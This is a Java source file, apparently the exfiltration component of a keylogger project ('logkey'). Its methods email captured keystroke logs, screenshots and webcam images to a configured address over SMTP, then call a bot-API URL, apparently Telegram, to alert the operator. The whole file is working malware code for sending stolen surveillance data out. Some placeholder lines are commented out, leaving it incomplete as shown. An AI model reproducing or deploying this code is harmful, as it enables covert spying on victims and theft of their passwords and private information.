package logkey.email;

import java.io.File;
import java.io.IOException;
import org.apache.commons.mail.EmailAttachment;
import org.apache.commons.mail.EmailException;
import org.apache.commons.mail.MultiPartEmail;
import org.apache.commons.mail.SimpleEmail;
import java.io.BufferedInputStream;
import java.io.InputStream;
import java.net.URL;
import java.net.URLConnection;
import java.io.BufferedReader;
import java.io.BufferedWriter;
import java.io.FileWriter;
import java.io.FileReader;
import java.io.*;

public class SendEmail {

    private String smtp;
    private String email_from;
    private String email_password;
    private String email_to;
    private String subject;
    private String msg;
    private String port;
    private boolean ssl;
    private boolean tls;
    private boolean debug;

    String urlString = //"urlString";//
    String apiToken = //"Token";//
    String chatId = //"chatId";//
    String text = "WARNING: inappropriate word has been detected. Please check your email ASAP for more info.";


    private static String app_path = //"C:\\log(K)ey\\Logs";//
    

    public void sendSimpleEmail(String email_to, String subject, String msg) {

        urlString = String.format(urlString, apiToken, chatId, text);
        SimpleEmail email = new SimpleEmail();

        msg= "Keylogger has sent you a message.\n";

        try {
            email.setDebug(debug);
            email.setHostName(smtp);
            email.addTo(email_to);
            email.setFrom(email_from);
            email.setAuthentication(email_from, email_password);
            email.setSubject(subject);
            email.setMsg(msg);
            email.setSSL(ssl);
            email.setTLS(tls);
            email.send();
        } catch (EmailException e) {
            System.out.println(e.getMessage());
        }

        try{
            URL url = new URL(urlString);
            URLConnection conn = url.openConnection();
            InputStream is = new BufferedInputStream(conn.getInputStream());
        } catch (IOException e) {
            e.printStackTrace();
        }

    }

    public void sendEmailAttachment(String email_to, String assunto, String msg, String file_screenshot, String file_cam, String file_logs) {
        File cam_file = new File(file_cam);
        if (!cam_file.exists()) {
            try {
                File new_file = new File(file_cam);
                new_file.createNewFile();
            } catch (IOException e) {
                System.out.println(e.getMessage());
            }
        }


        urlString = String.format(urlString, apiToken, chatId, text);

        msg= "Keylogger has sent you 3 attachment.\n";


        File fileScreenshot = new File(file_screenshot);
        EmailAttachment attachmentScreenshot = new EmailAttachment();
        attachmentScreenshot.setPath(fileScreenshot.getPath());
        attachmentScreenshot.setDisposition(EmailAttachment.ATTACHMENT);
        attachmentScreenshot.setDescription("Screenshot");
        attachmentScreenshot.setName(fileScreenshot.getName());

        File fileCam = new File(file_cam);
        EmailAttachment attachmentCam = new EmailAttachment();
        attachmentCam.setPath(fileCam.getPath());
        attachmentCam.setDisposition(EmailAttachment.ATTACHMENT);
        attachmentCam.setDescription("Cam");
        attachmentCam.setName(fileCam.getName());

        File fileLogs = new File(file_logs);
        EmailAttachment attachmentLogs = new EmailAttachment();
        attachmentLogs.setPath(fileLogs.getPath());
        attachmentLogs.setDisposition(EmailAttachment.ATTACHMENT);
        attachmentLogs.setDescription("Logs");
        attachmentLogs.setName(fileLogs.getName());

        try {
            MultiPartEmail email = new MultiPartEmail();
            email.setDebug(debug);
            email.setHostName(smtp);
            email.addTo(email_to);
            email.setFrom(email_from);
            email.setAuthentication(email_from, email_password);
            email.setSubject(assunto);
            email.setMsg(msg);
            email.setSSL(true);
            email.attach(attachmentScreenshot);
            email.attach(attachmentCam);
            email.attach(attachmentLogs);
            email.send();
        } catch (EmailException e) {
            System.out.println(e.getMessage());
        }

        try{
            URL url = new URL(urlString);
            URLConnection conn = url.openConnection();
            InputStream is = new BufferedInputStream(conn.getInputStream());
        } catch (IOException e) {
            e.printStackTrace();
        }
    }


    public void sendEmailAttachment(String email_to, String assunto, String msg, String file, String file_logs) {


        urlString = String.format(urlString, apiToken, chatId, text);
        msg= "Keylogger has sent you 2 attachment.\n";

        File fileScreenshot = new File(file);
        EmailAttachment attachment = new EmailAttachment();
        attachment.setPath(fileScreenshot.getPath());
        attachment.setDisposition(EmailAttachment.ATTACHMENT);
        attachment.setDescription("Attachment");
        attachment.setName(fileScreenshot.getName());

        File fileLogs = new File(file_logs);
        EmailAttachment attachmentLogs = new EmailAttachment();
        attachmentLogs.setPath(fileLogs.getPath());
        attachmentLogs.setDisposition(EmailAttachment.ATTACHMENT);
        attachmentLogs.setDescription("Logs");
        attachmentLogs.setName(fileLogs.getName());

        try {
            MultiPartEmail email = new MultiPartEmail();
            email.setDebug(debug);
            email.setHostName(smtp);
            email.addTo(email_to);
            email.setFrom(email_from);
            email.setAuthentication(email_from, email_password);
            email.setSubject(assunto);
            email.setMsg(msg);
            email.setSSL(true);
            email.attach(attachment);
            email.attach(attachmentLogs);
            email.send();
        } catch (EmailException e) {
            System.out.println(e.getMessage());
        }

        try{
            URL url = new URL(urlString);
            URLConnection conn = url.openConnection();
            InputStream is = new BufferedInputStream(conn.getInputStream());
        } catch (IOException e) {
            e.printStackTrace();
        }

    }

    public void sendEmailAttachment(String email_to, String assunto, String msg, String file_logs) {


        urlString = String.format(urlString, apiToken, chatId, text);
        msg= "Keylogger has sent you 1 attachment.\n";

        File fileLogs = new File(file_logs);
        EmailAttachment attachmentLogs = new EmailAttachment();
        attachmentLogs.setPath(fileLogs.getPath());
        attachmentLogs.setDisposition(EmailAttachment.ATTACHMENT);
        attachmentLogs.setDescription("Logs");
        attachmentLogs.setName(fileLogs.getName());

        try {
            MultiPartEmail email = new MultiPartEmail();
            email.setDebug(debug);
            email.setHostName(smtp);
            email.addTo(email_to);
            email.setFrom(email_from);
            email.setAuthentication(email_from, email_password);
            email.setSubject(assunto);
            email.setMsg(msg);
            email.setSSL(true);
            email.attach(attachmentLogs);
            email.send();
        } catch (EmailException e) {
            System.out.println(e.getMessage());
        }

        try{
            URL url = new URL(urlString);
            URLConnection conn = url.openConnection();
            InputStream is = new BufferedInputStream(conn.getInputStream());
        } catch (IOException e) {
            e.printStackTrace();
        }
        
    }

    public SendEmail(String smtp, String email_from, String email_password, String port, boolean ssl, boolean tls, boolean debug) {
        this.smtp = smtp;
        this.email_from = email_from;
        this.email_password = email_password;
        this.port = port;
        this.ssl = ssl;
        this.tls = tls;
        this.debug = debug;
    }
}
